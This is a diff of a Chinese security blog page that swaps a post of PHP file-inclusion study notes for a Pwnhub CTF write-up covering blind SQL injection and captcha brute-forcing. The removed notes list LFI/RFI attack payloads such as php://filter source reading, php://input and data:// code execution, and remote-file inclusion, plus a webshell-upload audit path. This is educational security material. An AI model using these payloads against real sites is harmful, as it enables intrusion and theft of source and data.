@@ -15,18 +15,28 @@
 
 
 
-<meta name="description" content="文件包含漏洞学习笔记">
-<meta name="keywords" content="Summary,代码审计,PHP,PHP文件包含漏洞">
+<meta name="description" content="这几天复现了一下 Pwnhub会员日 的一道题。">
+<meta name="keywords" content="CTF,Summary">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php文件包含漏洞Summary">
-<meta property="og:url" content="http://akkayin.github.io/2017/12/17/php文件包含漏洞/index.html">
+<meta property="og:title" content="复现Pwnhub会员日的一道题">
+<meta property="og:url" content="http://akkayin.github.io/2018/03/13/复现Pwnhub会员日/index.html">
 <meta property="og:site_name" content="KarmA&#39;s Blog">
-<meta property="og:description" content="文件包含漏洞学习笔记">
+<meta property="og:description" content="这几天复现了一下 Pwnhub会员日 的一道题。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-01-01T14:18:43.481Z">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fpcmdthln0j30eu0pg0tq.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fpcmr2wbazj308u0bmjs3.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fpcmt0stvpj30qk06275h.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcly1fpcrxzb723j30k4068t9p.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1fpdihqenxrj31kw0ajmza.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcly1fpcsd2if6fj30qe02q3z6.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcly1fpdiamtvsij30tq0pcq7n.jpg">
+<meta property="og:image" content="http://akkayin.github.io/2018/03/13/复现Pwnhub会员日/media/15210976085381.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1fpdpeazc6cj30ru03udgz.jpg">
+<meta property="og:updated_time" content="2018-03-15T16:03:46.075Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="php文件包含漏洞Summary">
-<meta name="twitter:description" content="文件包含漏洞学习笔记">
+<meta name="twitter:title" content="复现Pwnhub会员日的一道题">
+<meta name="twitter:description" content="这几天复现了一下 Pwnhub会员日 的一道题。">
+<meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fpcmdthln0j30eu0pg0tq.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -58,7 +68,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>php文件包含漏洞Summary | KarmA&#39;s Blog</title>
+<title>复现Pwnhub会员日的一道题 | KarmA&#39;s Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -266,11 +276,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-php文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-复现Pwnhub会员日" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/12/17/php文件包含漏洞/" class="article-date">
-      <time datetime="2017-12-17T02:15:03.000Z" itemprop="datePublished">2017-12-17</time>
+      <a href="/2018/03/13/复现Pwnhub会员日/" class="article-date">
+      <time datetime="2018-03-13T13:31:59.000Z" itemprop="datePublished">2018-03-13</time>
 </a>
 
 
@@ -285,7 +295,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      php文件包含漏洞Summary
+      复现Pwnhub会员日的一道题
     </h1>
   
 
@@ -300,7 +310,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP文件包含漏洞/">PHP文件包含漏洞</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Summary/">Summary</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Summary/">Summary</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -312,26 +322,23 @@
           
         <excerpt in="" index="" |="" 首页摘要="">
 
-<p>文件包含漏洞学习笔记<a id="more"></a></p>
+<p>这几天复现了一下 Pwnhub会员日 的一道题。<a id="more"></a></p>
 <the rest="" of="" contents="" |="" 余下全文="">
 
-
-
-<p>相关函数：</p>
-<p>include($file)</p>
-<p>include($path.$filename.$ext)</p>
-<h2 id="本地包含LFI"><a href="#本地包含LFI" class="headerlink" title="本地包含LFI"></a>本地包含LFI</h2><h3 id="限制后缀-php"><a href="#限制后缀-php" class="headerlink" title="限制后缀 *.php"></a>限制后缀 *.php</h3><h4 id="伪协议-zip-amp-phba"><a href="#伪协议-zip-amp-phba" class="headerlink" title="伪协议 zip:// &amp;phba//"></a>伪协议 zip:// &amp;phba//</h4><p>限制路径（$path），不能用伪协议和远程文件包含</p>
-<p>限制路径，不限制后缀，可包含日志&amp;环境变量&amp;session文件&amp;临时文件</p>
-<p>路径后缀都限制–&gt;无法利用</p>
-<p>审计思路：根据include()的内容，判断包含的后缀名–&gt;判断上传的后缀名，构造一句话木马–&gt;运用伪协议(phar://path/file/xx.inc)–&gt;寻找php处理上传文件的方式，以及利用方式（全局搜索：$_FILES）–&gt;构造payload–&gt;测试是否已经包含一句话木马脚本–&gt;如何修复（定义一个数组，判断传递的数据是否存在于已设定的数组里或者限定路径和后缀php则不能用协议去读取任意文件）</p>
+<p>一开始创表和字段的时候自信的自己创。。然后发现出问题了。。然后。。就老老实实的“自带”的代码。。然后就ojbk了～～</p>
+<p>这道题涉及了太多太多原先我并不知道的东西，所以仔细思考下来，还是收获了很多新姿势～</p>
+<p>面对一开始的login界面，<img src="https://ws4.sinaimg.cn/large/006tNc79ly1fpcmdthln0j30eu0pg0tq.jpg" alt=""><br>测试了半天，发现没有注入点，然后不知道怎么进行下一步，就很懵逼～</p>
+<h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2><p>对于一个没有丰富ctf经验的小白来说。。就真的不知道要用扫描器这个神奇的东西～～后来发现thisisourcecode，就赶紧download下来审计一波～～<img src="https://ws1.sinaimg.cn/large/006tNc79ly1fpcmr2wbazj308u0bmjs3.jpg" alt="">就只有几个php，根据代码审计老套路～寻找可控点～捋清楚逻辑</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>profile.php 中有一个注入点<img src="https://ws3.sinaimg.cn/large/006tNc79ly1fpcmt0stvpj30qk06275h.jpg" alt="">但是。。过滤了我认为最重要的()，这就很难受了。。因为这样子，我该如何注入啊？？</p>
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>要想拿到flag，<br>1.就要拿到$secrect<img src="https://ws1.sinaimg.cn/large/006tKfTcly1fpcrxzb723j30k4068t9p.jpg" alt="">因为兑换码是一个“str_shuffle“的随机字符串</p>
 <blockquote>
-<p>把时间信息（firebug抓包获得）转换为时间戳，推断文件名</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;data_default_timezone_set(<span class="string">'UTC'</span>);</span><br><span class="line">&gt;<span class="keyword">echo</span> strtotime(<span class="string">''</span>);</span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<p><a href="http://php.net/manual/zh/function.str-shuffle.php" target="_blank" rel="noopener">str_shuffle</a><br>但是要值得注意的是，这个函数是将字符串用伪随机的方式打乱，也就是一个字母用了一次之后，就不会再用第二次，我们可以利用<img src="https://ws2.sinaimg.cn/large/006tKfTcly1fpdihqenxrj31kw0ajmza.jpg" alt="">这个东西也是做了这套题为才知道的～～</p>
 </blockquote>
-<p><a href="http://blog.csdn.net/u010726042/article/details/75041367" target="_blank" rel="noopener">php文件包含+伪协议+文件上传漏洞利用实例</a></p>
-<p><a href="http://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1" target="_blank" rel="noopener">php 伪协议</a></p>
-<h4 id="截断大法"><a href="#截断大法" class="headerlink" title="截断大法"></a>截断大法</h4><p>（php更新之后已修复）</p>
-<h3 id="日志-amp-环境变量"><a href="#日志-amp-环境变量" class="headerlink" title="日志&amp;环境变量"></a>日志&amp;环境变量</h3><h3 id="session文件"><a href="#session文件" class="headerlink" title="session文件"></a>session文件</h3><h3 id="结合phpinfo-包含临时文件"><a href="#结合phpinfo-包含临时文件" class="headerlink" title="结合phpinfo 包含临时文件"></a>结合phpinfo 包含临时文件</h3><h3 id="无后缀限制，包含任意文件"><a href="#无后缀限制，包含任意文件" class="headerlink" title="无后缀限制，包含任意文件"></a>无后缀限制，包含任意文件</h3><h3 id="读取任意文件，-file-php-filter-convert-base64-encode-resource-index-php"><a href="#读取任意文件，-file-php-filter-convert-base64-encode-resource-index-php" class="headerlink" title="读取任意文件，?file=php://filter/convert base64 encode/resource=index.php"></a>读取任意文件，?file=php://filter/convert base64 encode/resource=index.php</h3><h2 id="远程包含RFI-（默认off）"><a href="#远程包含RFI-（默认off）" class="headerlink" title="远程包含RFI （默认off）"></a>远程包含RFI （默认off）</h2><h3 id="allow-url-include-amp-amp-allow-url-fopen-Off"><a href="#allow-url-include-amp-amp-allow-url-fopen-Off" class="headerlink" title="allow_url_include &amp;&amp; allow_url_fopen= Off"></a>allow_url_include &amp;&amp; allow_url_fopen= Off</h3><h4 id="代码执行，-file-php-input"><a href="#代码执行，-file-php-input" class="headerlink" title="代码执行，?file=php://input"></a>代码执行，?file=php://input</h4><h4 id="利用tata-URIs，-file-data-text-plain-base64-SSBsb3ZIIFBIUAo"><a href="#利用tata-URIs，-file-data-text-plain-base64-SSBsb3ZIIFBIUAo" class="headerlink" title="利用tata URIs，?file=data://text/plain,base64,SSBsb3ZIIFBIUAo="></a>利用tata URIs，?file=data://text/plain,base64,SSBsb3ZIIFBIUAo=</h4><h3 id="allow-url-fopen-On"><a href="#allow-url-fopen-On" class="headerlink" title="allow_url_fopen = On"></a>allow_url_fopen = On</h3><h4 id="远程代码执行-file-http-https-ftp-xxx-file"><a href="#远程代码执行-file-http-https-ftp-xxx-file" class="headerlink" title="远程代码执行 ?file=[http|https|ftp]://xxx/file"></a>远程代码执行 ?file=[http|https|ftp]://xxx/file</h4><h4 id="利用XSS执行任意代码-file-http-xxx-xss-php-css-phpcode"><a href="#利用XSS执行任意代码-file-http-xxx-xss-php-css-phpcode" class="headerlink" title="利用XSS执行任意代码 ?file=http://xxx/xss.php?css=phpcode"></a>利用XSS执行任意代码 ?file=<a href="http://xxx/xss.php?css=phpcode" target="_blank" rel="noopener">http://xxx/xss.php?css=phpcode</a></h4><h4 id="远程代码执行-file-http-https-ftp-xxx-file-txt-23"><a href="#远程代码执行-file-http-https-ftp-xxx-file-txt-23" class="headerlink" title="远程代码执行 ?file=[http|https|ftp]://xxx/file.txt[?|%23]"></a>远程代码执行 ?file=[http|https|ftp]://xxx/file.txt[?|%23]</h4><p><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">文件包含漏洞小结</a></p>
+<p>2.就要爆破出验证码<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fpcsd2if6fj30qe02q3z6.jpg" alt=""></p>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><h4 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>要找出36位的兑换码不难，难得是<img src="https://ws3.sinaimg.cn/large/006tKfTcly1fpdiamtvsij30tq0pcq7n.jpg" alt="">他还限制了次数，超过了140次，就重置掉，所以。。傻瓜式遍历，肯定行不通～～这对一个虽然学过二分法，但是不知道怎么用python来实现的freshman来说，好像是有点残忍～～然后感谢彭锅(Ph0rse)给的思路～再去找了些<a href="http://www.cnblogs.com/yupeng/p/3418293.html" target="_blank" rel="noopener">资料</a>，似乎搞懂了。。<br>虽然我们要找到数据库中的兑换码，但是，兑换码在哪一列？不知道，而且过滤了()，也就意味着不能用mysql的一系列函数，来爆破列名（废话，要是能爆列名，还要盲注干嘛 :D )。<br>于是又从彭锅那里学到一招：<img src="media/15210976085381.jpg" alt=""><br>手动测试一下，回显位是第二位，果然是这样的。。所以就可以开始写脚本了。</p>
+<h4 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h4><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fpdpeazc6cj30ru03udgz.jpg" alt=""><br>对传入的captcha经过md5加密后取前4位，与session的验证码比较。所以就需要写个脚本逆向爆破一下。得到加密前的验证码。</p>
+<p><br></p>
+<p>然后就得到flag了。。。</p>
 </the></excerpt>
       
     </div>
@@ -340,13 +347,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/12/17/php文件包含漏洞/">php文件包含漏洞Summary</a></p>
+        <p><span>本文标题:</span><a href="/2018/03/13/复现Pwnhub会员日/">复现Pwnhub会员日的一道题</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">KarmA</a></p>
-        <p><span>发布时间:</span>2017-12-17, 10:15:03</p>
-        <p><span>最后更新:</span>2018-01-01, 22:18:43</p>
+        <p><span>发布时间:</span>2018-03-13, 21:31:59</p>
+        <p><span>最后更新:</span>2018-03-16, 00:03:46</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/12/17/php文件包含漏洞/" title="php文件包含漏洞Summary">http://akkayin.github.io/2017/12/17/php文件包含漏洞/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://akkayin.github.io/2017/12/17/php文件包含漏洞/　　作者: KarmA" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/03/13/复现Pwnhub会员日/" title="复现Pwnhub会员日的一道题">http://akkayin.github.io/2018/03/13/复现Pwnhub会员日/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://akkayin.github.io/2018/03/13/复现Pwnhub会员日/　　作者: KarmA" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -358,16 +365,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/12/18/php文件操作漏洞/">
-                    php文件操作漏洞
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/12/16/authenticwords/">
-                    Authentic Words Summary
+                <a href="/2018/03/01/thanksgiving/">
+                    Being grateful for what you have
                 </a>
             </div>
         
@@ -379,7 +380,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#本地包含LFI"><span class="toc-text">本地包含LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#限制后缀-php"><span class="toc-text">限制后缀 *.php</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#伪协议-zip-amp-phba"><span class="toc-text">伪协议 zip:// &phba//</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#截断大法"><span class="toc-text">截断大法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#日志-amp-环境变量"><span class="toc-text">日志&环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session文件"><span class="toc-text">session文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#结合phpinfo-包含临时文件"><span class="toc-text">结合phpinfo 包含临时文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无后缀限制，包含任意文件"><span class="toc-text">无后缀限制，包含任意文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读取任意文件，-file-php-filter-convert-base64-encode-resource-index-php"><span class="toc-text">读取任意文件，?file=php://filter/convert base64 encode/resource=index.php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#远程包含RFI-（默认off）"><span class="toc-text">远程包含RFI （默认off）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#allow-url-include-amp-amp-allow-url-fopen-Off"><span class="toc-text">allow_url_include && allow_url_fopen= Off</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码执行，-file-php-input"><span class="toc-text">代码执行，?file=php://input</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用tata-URIs，-file-data-text-plain-base64-SSBsb3ZIIFBIUAo"><span class="toc-text">利用tata URIs，?file=data://text/plain,base64,SSBsb3ZIIFBIUAo=</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#allow-url-fopen-On"><span class="toc-text">allow_url_fopen = On</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#远程代码执行-file-http-https-ftp-xxx-file"><span class="toc-text">远程代码执行 ?file=[http|https|ftp]://xxx/file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用XSS执行任意代码-file-http-xxx-xss-php-css-phpcode"><span class="toc-text">利用XSS执行任意代码 ?file=http://xxx/xss.php?css=phpcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#远程代码执行-file-http-https-ftp-xxx-file-txt-23"><span class="toc-text">远程代码执行 ?file=[http|https|ftp]://xxx/file.txt[?|%23]</span></a></li></ol></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Process"><span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-text">Flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution"><span class="toc-text">Solution</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL注入-1"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#验证码"><span class="toc-text">验证码</span></a></li></ol></li></ol></li></ol>
         
     </div>
     <style>
@@ -415,7 +416,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"php文件包含漏洞Summary　| KarmA's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"复现Pwnhub会员日的一道题　| KarmA's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -449,15 +450,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/12/18/php文件操作漏洞/" title="上一篇: php文件操作漏洞">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/12/16/authenticwords/" title="下一篇: Authentic Words Summary">
+            <a href="/2018/03/01/thanksgiving/" title="下一篇: Being grateful for what you have">
                 <i class="fa fa-angle-right"></i>
             </a>
         
